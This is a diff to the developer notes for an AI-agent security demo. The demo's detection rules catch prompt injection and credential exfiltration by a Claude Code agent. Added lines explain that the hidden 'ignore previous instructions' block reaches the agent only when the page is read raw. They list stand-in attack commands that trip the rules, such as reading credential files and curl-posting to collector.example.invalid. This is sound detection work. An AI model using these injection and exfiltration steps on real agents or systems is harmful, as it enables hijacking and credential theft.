@@ -24,7 +24,7 @@ the stage runbook, and the design docs for the slide deck. Read `docs/` before c
 ```
 README.md, src/, config.yaml   # the "Orderbook Service" — a harmless target project the agent reads during the demo
 .claude/settings.json          # tags sessions as deployment dss-demo-dev (do not change to dss-demo)
-sandbox-home/                  # HOME for the demo session: FAKE ~/.aws/credentials and ~/.ssh/id_demo
+sandbox-home/                  # HOME for the demo session: FAKE ~/.aws/credentials, ~/.ssh/id_demo, demo-fixtures/sample.env (fake tokens)
 pages/vendor-notes.html        # the "attacker page": vendor release notes with a hidden prompt-injection block, served by GitHub Pages
 demo/setup.sh                  # one-shot laptop setup: installs the hook plugin, wires ~/.claude/settings.json, --verify/--uninstall
 demo/run-demo.sh               # launches Claude Code with HOME=sandbox-home and deployment dss-demo
@@ -33,6 +33,7 @@ demo/RUNBOOK.md                # the ≈5-minute stage script (7 beats) — the 
 demo/sql/0*.sql                # the four demo detection rules (materialized views), as created on the stack
 demo/build_dashboard.py        # generates + validates + PUTs the "AgentGuard Overview" dashboard
 demo/dashboard.json            # last published dashboard body; dashboard.backup.json = the shipped app version
+demo/reset_data.py             # clears demo threats (dss-demo/dss-demo-dev only) for a clean rerun; keeps the rules
 demo/cleanup.sql               # removes every demo object from the stack
 docs/dss2026-agentguard-e2e-demo-design.md      # demo design, decisions, engine/Console gotchas (read first)
 docs/dss2026-machine-speed-defense-slide-brief.md # the spec for generating the slide deck (22 slides)
@@ -73,6 +74,13 @@ injection → exfiltration in one session within a `hop(1m, 10m)` window (critic
 thanks to `mv_threats` dedup) · `mv_rule_demo004` more than 40 tool calls per minute per agent (warning;
 the presenter's normal peak is 22/min). Pause/resume: `SYSTEM PAUSE|RESUME MATERIALIZED VIEW ag.<name>`.
 
+**`demo-001` does NOT fire on a `WebFetch` of the attacker page.** Claude Code's WebFetch runs the fetched
+page through a model and returns only a *summary*; the raw "ignore previous instructions" text never reaches
+`tool_result`, so the `LIKE` predicate misses it (verified 2026-10-07: WebFetch result paraphrases the hidden
+block). The injection text reaches `tool_result` only when the agent reads the page raw — `curl -s <url>`,
+`grep` of the page, or `Read` of a saved copy. So the Fetch beat must include a raw read (a `curl` of the
+URL) to light `demo-001`; the WebFetch still provides the chain's `probe` stage.
+
 ## Engine and Console gotchas (all hit on this stack — do not rediscover them)
 
 - Regex word boundaries inside SQL string literals need `\\b` (double backslash); single `\b` is a backspace.
@@ -93,6 +101,14 @@ the presenter's normal peak is 22/min). Pause/resume: `SYSTEM PAUSE|RESUME MATER
   Multi-series lines need long format (`series` column + `config.color = 'series'`), not several `yAxis`
   columns. Variables substitute raw (`{{filter_time_range}}` → `15m`; quote string ones). A streaming
   table panel backfills with `SETTINGS seek_to = '-15m'`.
+- **Streaming vs historical panels.** A panel is streaming (pushes live updates, no manual refresh) when
+  its SQL queries the stream directly (no `table(...)`) and backfills with `SETTINGS seek_to = '-<range>'`;
+  it is historical (snapshot) when it wraps the source in `table(...)` with a `now()` window. **Keep at most
+  four streaming panels**: with nine the Console page blocked (2026-10-07). The four that stream are the ones
+  the runbook watches live: Open critical threats, Live tool calls, Attack chain by session, Recent threats.
+  Everything else (the other KPI tiles, threats-over-time, threats-by-severity, baseline, sessions) is
+  historical. `build_dashboard.py` validates streaming panels via `/sqlanalyze` (`is_streaming` must be true)
+  and historical ones via `/exec`.
 - The app regenerates its dashboard on upgrade: after any AgentGuard app upgrade, re-run
   `python3 demo/build_dashboard.py` (it validates every panel through `/exec` or `/sqlanalyze` and then
   `PUT`s; pass `--dry` to validate only). Verify in the Console with Playwright at 1920 px, zero console errors.
@@ -122,4 +138,11 @@ server feature and use the recorded demo, not this stack. Open items: speaker na
 - 2026-10-06: no hold in the live demo (app has no hold feature); no OTel; four `demo_` MVs created;
   installed dashboard edited in place rather than a new one; attacker page hosted as a gist/Pages.
 - 2026-10-07: repo published public at github.com/timeplus-io/agentguard-demo-target; attacker page served by GitHub Pages from `main`.
+- 2026-10-07: live demo redesigned to use **benign signature commands** instead of asking the agent to steal
+  credentials. A well-aligned model (Fable 5.1 and the other Claude Code models) correctly refuses the real
+  exfil, so the chain never fired. The rules match tool-call *signatures* in telemetry, so benign stand-ins
+  trigger them: WebFetch the page (probe + demo-001), `grep` the page for the hidden block (injection stage +
+  demo-001), `ls ~/.aws/credentials ~/.ssh/id_demo` (credential_access), `cat sandbox-home/demo-fixtures/sample.env`
+  (rp-002), `curl --data status=ok https://collector.example.invalid/x` (demo-003 + exfiltration → demo-chain).
+  Verified live 2026-10-07: all five rules fired in one session with no refusal. See `demo/RUNBOOK.md`.
 - 2026-10-06: presentations docs moved here from the neutron repo; dev sessions tagged `dss-demo-dev`.
